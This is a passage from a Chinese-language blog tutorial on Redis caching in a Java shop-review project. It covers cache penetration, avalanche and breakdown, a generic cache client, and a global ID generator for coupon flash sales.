template.delete(CACHE_SHOP_KEY + shop.getId());<br>    <span class="hljs-comment">// 3.返回</span><br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-4-缓存穿透"><a href="#2-4-缓存穿透" class="headerlink" title="2.4 缓存穿透"></a>2.4 缓存穿透</h3><h4 id="2-4-1-介绍与解决思路"><a href="#2-4-1-介绍与解决思路" class="headerlink" title="2.4.1 介绍与解决思路"></a>2.4.1 介绍与解决思路</h4><p>客户端请求的数据在缓存和数据库中都不存在，最终这些请求均会到达数据库。若多线程高并发请求，则会使数据库崩溃。</p><p>解决方案：</p><ol><li>缓存空对象：当请求到达数据库，数据库也不存在时，则缓存一个空对象，之后再次请求时，缓存命中并返回空对象。<ul><li>优点：实现简单，维护方便</li><li>缺点：额外内存消耗（可设置TTL解决）、短期不一致（可能缓存空对象后，又插入了真实数据，造成缓存与数据库不一致）</li></ul></li><li>布隆过滤器<ul><li>优点：内存占用少，没有多余key</li><li>缺点：实现复杂，存在误判可能性</li></ul></li></ol><h4 id="2-4-2-代码实现"><a href="#2-4-2-代码实现" class="headerlink" title="2.4,2 代码实现"></a>2.4,2 代码实现</h4><p>修改ShopServiceImpl中的queryById方法</p><p>需要注意的是：isNotBlank方法只有在为Null以及为””的情况下返回false</p><ul><li>如果其返回true，则表示缓存中存在店铺信息，直接返回信息</li><li>如果其返回false，则需进一步判断是Null还是””<ul><li>如果是””，则代表已设置了空对象，报错</li><li>如果是Null，则代表当前缓存中不存在该信息，则需要进一步查询数据库</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryById</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.从Redis中查询商铺缓存</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">shopJson</span> <span class="hljs-operator">=</span> template.opsForValue().get(CACHE_SHOP_KEY + id);<br>    <span class="hljs-comment">// 2.判断是否存在</span><br>    <span class="hljs-keyword">if</span> (StrUtil.isNotBlank(shopJson)) &#123;<br>        <span class="hljs-comment">// 3.存在则直接返回</span><br>        <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> JSONUtil.toBean(shopJson, Shop.class);<br>        <span class="hljs-keyword">return</span> Result.ok(shop);<br>    &#125;<br>    <span class="hljs-comment">// 判断命中的是否是空值</span><br>    <span class="hljs-keyword">if</span> (shopJson != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;店铺信息不存在！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 4.不存在则根据ID查询数据库</span><br>    <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> getById(id);<br>    <span class="hljs-comment">// 5.不存在，将空值写入Redis，返回错误</span><br>    <span class="hljs-keyword">if</span> (shop == <span class="hljs-literal">null</span>) &#123;<br>        template.opsForValue().set(CACHE_SHOP_KEY + id, <span class="hljs-string">&quot;&quot;</span>, CACHE_NULL_TTL, TimeUnit.MINUTES);<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;店铺不存在！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 6.存在则写入Redis</span><br>    template.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);<br>    <span class="hljs-keyword">return</span> Result.ok(shop);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-5-缓存雪崩"><a href="#2-5-缓存雪崩" class="headerlink" title="2.5 缓存雪崩"></a>2.5 缓存雪崩</h3><p>在同一时段有大量的缓存key同时失效或Redis宕机，导致大量请求进入数据库，带来巨大压力</p><p>解决方案：</p><ol><li>给不同key设置随机的TTL值</li><li>利用Redis集群提高服务的可用性</li><li>给缓存业务添加降级限流策略</li><li>给业务添加多级缓存</li></ol><h3 id="2-6-缓存击穿"><a href="#2-6-缓存击穿" class="headerlink" title="2.6 缓存击穿"></a>2.6 缓存击穿</h3><p>缓存击穿也被称为热点key问题，就是一个被<strong>高并发访问</strong>并且<strong>缓存重建业务较复杂</strong>的key突然失效了，无数请求进入数据库，在瞬间给数据库造成巨大冲击。</p><p>解决方案：</p><ol><li><p>互斥锁：并发线程中只有一个线程获取到锁，进行缓存重建操作，重建完成并释放锁之后，其他线程再次查询缓存。</p></li><li><p>逻辑过期：为缓存设置逻辑过期时间，若某个线程发现逻辑时间已过期，便去获取互斥锁，获取成功之后去开启新线程重建缓存，其直接返回过期的数据即可。</p><p>其他线程访问时也是同理，若其发现逻辑时间过期，则去获取互斥锁，若获取失败，说明有线程正在重建缓存，其直接返回过期数据</p></li></ol><p>对比：</p><ol><li><p>互斥锁没有额外内存消耗，实现简单，可以保证一致性</p><p>但互斥锁的性能较差，且存在死锁风险</p></li><li><p>逻辑过期线程无需等待，性能较好</p><p>但其不保证一致性，有额外的内存消耗，实现较为复杂</p></li></ol><h4 id="2-6-1-代码实现"><a href="#2-6-1-代码实现" class="headerlink" title="2.6.1 代码实现"></a>2.6.1 代码实现</h4><h5 id="基于互斥锁"><a href="#基于互斥锁" class="headerlink" title="基于互斥锁"></a>基于互斥锁</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryById</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 缓存穿透</span><br>    <span class="hljs-comment">// Shop shop = queryWithPassThrough(id);</span><br>    <span class="hljs-comment">// 互斥锁解决缓存击穿</span><br>    <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> queryWithMutex(id);<br>    <span class="hljs-keyword">if</span> (shop == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;店铺不存在！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.ok(shop);<br>&#125;<br><br><span class="hljs-keyword">public</span> Shop <span class="hljs-title function_">queryWithMutex</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.从Redis中查询商铺缓存</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">shopJson</span> <span class="hljs-operator">=</span> template.opsForValue().get(CACHE_SHOP_KEY + id);<br>    <span class="hljs-comment">// 2.判断是否存在</span><br>    <span class="hljs-keyword">if</span> (StrUtil.isNotBlank(shopJson)) &#123;<br>        <span class="hljs-comment">// 3.存在则直接返回</span><br>        <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> JSONUtil.toBean(shopJson, Shop.class);<br>        <span class="hljs-keyword">return</span> shop;<br>    &#125;<br>    <span class="hljs-comment">// 判断命中的是否是空值</span><br>    <span class="hljs-keyword">if</span> (shopJson != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 4.实现缓存重建</span><br>    <span class="hljs-comment">// 4.1 获取互斥锁</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> LOCK_SHOP_KEY + id;<br>    <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> tryLock(lockKey);<br>        <span class="hljs-comment">// 4.2 判断是否获取成功</span><br>        <span class="hljs-keyword">if</span> (!isLock) &#123;<br>            <span class="hljs-comment">// 4.3 失败，休眠并充实</span><br>            Thread.sleep(<span class="hljs-number">50</span>);<br>            <span class="hljs-keyword">return</span> queryWithMutex(id);<br>        &#125;<br>        <span class="hljs-comment">// 4.4 成功，则根据id查询数据库</span><br>        shop = getById(id);<br>        <span class="hljs-comment">// 5.不存在，将空值写入Redis，返回错误</span><br>        <span class="hljs-keyword">if</span> (shop == <span class="hljs-literal">null</span>) &#123;<br>            template.opsForValue().set(CACHE_SHOP_KEY + id, <span class="hljs-string">&quot;&quot;</span>, CACHE_NULL_TTL, TimeUnit.MINUTES);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-comment">// 6.存在则写入Redis</span><br>        template.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 7.释放互斥锁</span><br>        unlock(lockKey);<br>    &#125;<br>    <span class="hljs-keyword">return</span> shop;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="基于逻辑过期"><a href="#基于逻辑过期" class="headerlink" title="基于逻辑过期"></a>基于逻辑过期</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Shop <span class="hljs-title function_">queryWithLogicalExpire</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.从Redis中查询商铺缓存</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">shopJson</span> <span class="hljs-operator">=</span> template.opsForValue().get(CACHE_SHOP_KEY + id);<br>    <span class="hljs-comment">// 2.判断是否存在</span><br>    <span class="hljs-keyword">if</span> (StrUtil.isBlank(shopJson)) &#123;<br>        <span class="hljs-comment">// 3.不存在直接返回</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 4.命中，将json反序列化为对象</span><br>    <span class="hljs-type">RedisData</span> <span class="hljs-variable">redisData</span> <span class="hljs-operator">=</span> JSONUtil.toBean(shopJson, RedisData.class);<br>    <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> JSONUtil.toBean((JSONObject) redisData.getData(), Shop.class);<br>    <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">expireTime</span> <span class="hljs-operator">=</span> redisData.getExpireTime();<br>    <span class="hljs-comment">// 5.判断是否过期</span><br>    <span class="hljs-comment">// 5.1 未过期，直接返回店铺信息</span><br>    <span class="hljs-keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;<br>        <span class="hljs-keyword">return</span> shop;<br>    &#125;<br>    <span class="hljs-comment">// 5.2 已过期，重建缓存</span><br>    <span class="hljs-comment">// 6.缓存重建</span><br>    <span class="hljs-comment">// 6.1 获取互斥锁</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> LOCK_SHOP_KEY + id;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> tryLock(lockKey);<br>    <span class="hljs-comment">// 6.2 判断获取锁是否成功</span><br>    <span class="hljs-keyword">if</span> (isLock) &#123;<br>        <span class="hljs-comment">// 6.3 成功，开启线程池，实现缓存重建</span><br>        CACHE_REBUILD_EXECUTOR.submit(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 重建缓存</span><br>                <span class="hljs-built_in">this</span>.saveShop2Redis(id, <span class="hljs-number">20L</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-comment">// 释放锁</span><br>                unlock(lockKey);<br>            &#125;<br>        &#125;);<br>    &#125;<br>    <span class="hljs-comment">// 6.4 返回过期的商铺信息</span><br>    <span class="hljs-keyword">return</span> shop;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-7-缓存工具封装"><a href="#2-7-缓存工具封装" class="headerlink" title="2.7 缓存工具封装"></a>2.7 缓存工具封装</h3><p>为使得解决缓存问题变得更加通用，封装一个缓存工具类，采用了泛型方法、函数式编程、Lambda表达式实现</p><ul><li>set：存储缓存键值对</li><li>setWithLogicalExpire：存储带有逻辑过期时间的缓存键值对</li><li>queryWithPassThrough：用于解决缓存穿透的查询</li><li>queryWithLogicalExpire：用于解决缓存击穿的查询</li></ul><p>具体流程为：</p><ol><li><p>在utils包下创建CacheClient类</p></li><li><p>添加如下四个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheClient</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> StringRedisTemplate template;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">set</span><span class="hljs-params">(String key, Object value, Long time, TimeUnit unit)</span> &#123;<br>        template.opsForValue().set(key, JSONUtil.toJsonStr(value), time, unit);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWithLogicalExpire</span><span class="hljs-params">(String key, Object value, Long time, TimeUnit unit)</span> &#123;<br>        <span class="hljs-comment">// 设置逻辑过期</span><br>        <span class="hljs-type">RedisData</span> <span class="hljs-variable">redisData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisData</span>();<br>        redisData.setData(value);<br>        redisData.setExpireTime(LocalDateTime.now().plusSeconds(unit.toSeconds(time)));<br>        template.opsForValue().set(key, JSONUtil.toJsonStr(redisData), time, unit);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> &lt;R, ID&gt; R <span class="hljs-title function_">queryWithPassThrough</span><span class="hljs-params">(String keyPrefix,</span><br><span class="hljs-params">                                          ID id, Class&lt;R&gt; type,</span><br><span class="hljs-params">                                          Function&lt;ID, R&gt; dbFallBack,</span><br><span class="hljs-params">                                          Long time, TimeUnit unit)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keyPrefix + id;<br>        <span class="hljs-comment">// 1.从Redis中查询商铺缓存</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> template.opsForValue().get(key);<br>        <span class="hljs-comment">// 2.判断是否存在</span><br>        <span class="hljs-keyword">if</span> (StrUtil.isNotBlank(json)) &#123;<br>            <span class="hljs-comment">// 3.存在则直接返回</span><br>            <span class="hljs-keyword">return</span> JSONUtil.toBean(json, type);<br>        &#125;<br>        <span class="hljs-comment">// 判断命中的是否是空值</span><br>        <span class="hljs-keyword">if</span> (json != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-comment">// 4.不存在则根据ID查询数据库</span><br>        <span class="hljs-type">R</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> dbFallBack.apply(id);<br>        <span class="hljs-comment">// 5.不存在，将空值写入Redis，返回错误</span><br>        <span class="hljs-keyword">if</span> (r == <span class="hljs-literal">null</span>) &#123;<br>            template.opsForValue().set(key, <span class="hljs-string">&quot;&quot;</span>, time, unit);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-comment">// 6.存在则写入Redis</span><br>        <span class="hljs-built_in">this</span>.set(key, JSONUtil.toJsonStr(r), time, unit);<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">CACHE_REBUILD_EXECUTOR</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> &lt;R, ID&gt; R <span class="hljs-title function_">queryWithLogicalExpire</span><span class="hljs-params">(String keyPrefix,</span><br><span class="hljs-params">                                            ID id, Class&lt;R&gt; type,</span><br><span class="hljs-params">                                            Function&lt;ID, R&gt; dbFallBack,</span><br><span class="hljs-params">                                            Long time, TimeUnit unit)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keyPrefix + id;<br>        <span class="hljs-comment">// 1.从Redis中查询商铺缓存</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> template.opsForValue().get(key);<br>        <span class="hljs-comment">// 2.判断是否存在</span><br>        <span class="hljs-keyword">if</span> (StrUtil.isBlank(json)) &#123;<br>            <span class="hljs-comment">// 3.不存在直接返回</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-comment">// 4.命中，将json反序列化为对象</span><br>        <span class="hljs-type">RedisData</span> <span class="hljs-variable">redisData</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, RedisData.class);<br>        <span class="hljs-type">R</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> JSONUtil.toBean((JSONObject) redisData.getData(), type);<br>        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">expireTime</span> <span class="hljs-operator">=</span> redisData.getExpireTime();<br>        <span class="hljs-comment">// 5.判断是否过期</span><br>        <span class="hljs-comment">// 5.1 未过期，直接返回店铺信息</span><br>        <span class="hljs-keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;<br>            <span class="hljs-keyword">return</span> r;<br>        &#125;<br>        <span class="hljs-comment">// 5.2 已过期，重建缓存</span><br>        <span class="hljs-comment">// 6.缓存重建</span><br>        <span class="hljs-comment">// 6.1 获取互斥锁</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> LOCK_SHOP_KEY + id;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> tryLock(lockKey);<br>        <span class="hljs-comment">// 6.2 判断获取锁是否成功</span><br>        <span class="hljs-keyword">if</span> (isLock) &#123;<br>            <span class="hljs-comment">// 6.3 成功，开启线程池，实现缓存重建</span><br>            CACHE_REBUILD_EXECUTOR.submit(() -&gt; &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">R</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> dbFallBack.apply(id);<br>                    <span class="hljs-built_in">this</span>.setWithLogicalExpire(key, r1, time, unit);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    <span class="hljs-comment">// 释放锁</span><br>                    unlock(lockKey);<br>                &#125;<br>            &#125;);<br>        &#125;<br>        <span class="hljs-comment">// 6.4 返回过期的商铺信息</span><br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(String key)</span> &#123;<br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> template.opsForValue().setIfAbsent(key, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">10</span>, TimeUnit.SECONDS);<br>        <span class="hljs-keyword">return</span> BooleanUtil.isTrue(flag);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">(String key)</span> &#123;<br>        template.delete(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-优惠券秒杀"><a href="#3-优惠券秒杀" class="headerlink" title="3. 优惠券秒杀"></a>3. 优惠券秒杀</h2><h3 id="3-1-全局唯一ID"><a href="#3-1-全局唯一ID" class="headerlink" title="3.1 全局唯一ID"></a>3.1 全局唯一ID</h3><h4 id="3-1-1-介绍"><a href="#3-1-1-介绍" class="headerlink" title="3.1.1 介绍"></a>3.1.1 介绍</h4><p>当用户进行优惠券秒杀时，会生成优惠券订单。如果订单编号采用数据库自增ID便会存在如下问题：</p><ol><li>ID规律明显</li><li>会受到当前表数据量的限制</li></ol><p>因此需要全局唯一ID生成器，用于在分布式系统下生成全局唯一ID</p><p>其满足：唯一性、高可用、高性能、递增性、安全性</p><p>该ID的设计规则如下：</p><ul><li>其二进制由64个bit组成：<ul><li>最高位第63位为符号位，始终为0</li><li>62~32位为时间戳，共31个bit</li><li>31~0位为序列号，共32个bit：序列号的自增是通过Redis的increment自增实现</li></ul></li></ul><h4 id="3-1-1-代码实现"><a href="#3-1-1-代码实现" class="headerlink" title="3.1.1 代码实现"></a>3.1.1 代码实现</h4><p>代码实现流程如下：</p><p>在utils包下创建RedisIdWorker类。</p><p>其中需要注意最终结果的返回需要将时间戳与序列号进行拼接，采用移位 + 或运算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisIdWorker</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">BEGIN_STAMP</span> <span class="hljs-operator">=</span> <span class="hljs-number">1640995200L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">COUNT_BITS</span> <span class="hljs-operator">=</span> <span class="hljs-number">32</span>;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> StringRedisTemplate template;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">nextId</span><span class="hljs-params">(String keyPrefix)</span> &#123;<br>        <span class="hljs-comment">// 1.生成时间戳</span><br>        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> LocalDateTime.now();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">nowSecond</span> <span class="hljs-operator">=</span> now.toEpochSecond(ZoneOffset.UTC);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> nowSecond - BEGIN_STAMP;<br>        <span class="hljs-comment">// 2.生成序列号</span><br>        <span class="hljs-comment">// 2.1 获取当前日期，精确到天</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> now.format(DateTimeFormatter.ofPattern(<span class="hljs-string">&quot;yyyy:MM:dd&quot;</span>));<br>        <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> template.opsForValue().increment(<span class="hljs-string">&quot;icr:&quot;</span> + keyPrefix + <span class="hljs-string">&quot;:&quot;</span> + date);<br>        <span class="hljs-comment">// 3.拼接并返回</span><br>        <span class="hljs-keyword">return</span> timestamp &lt;&lt; COUNT_BITS | count;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-优惠券秒杀下单"><a href="#3-2-优惠券秒杀下单" class="headerlink" title="3.2 优惠券秒杀下单"></a>3.2 优惠券秒杀下单</h3><h4 id="3-2-1-流程分析"><a href="#3-2-1-流程分析" class="headerlink" title="3.2.1 流程分析"></a>3.2.1 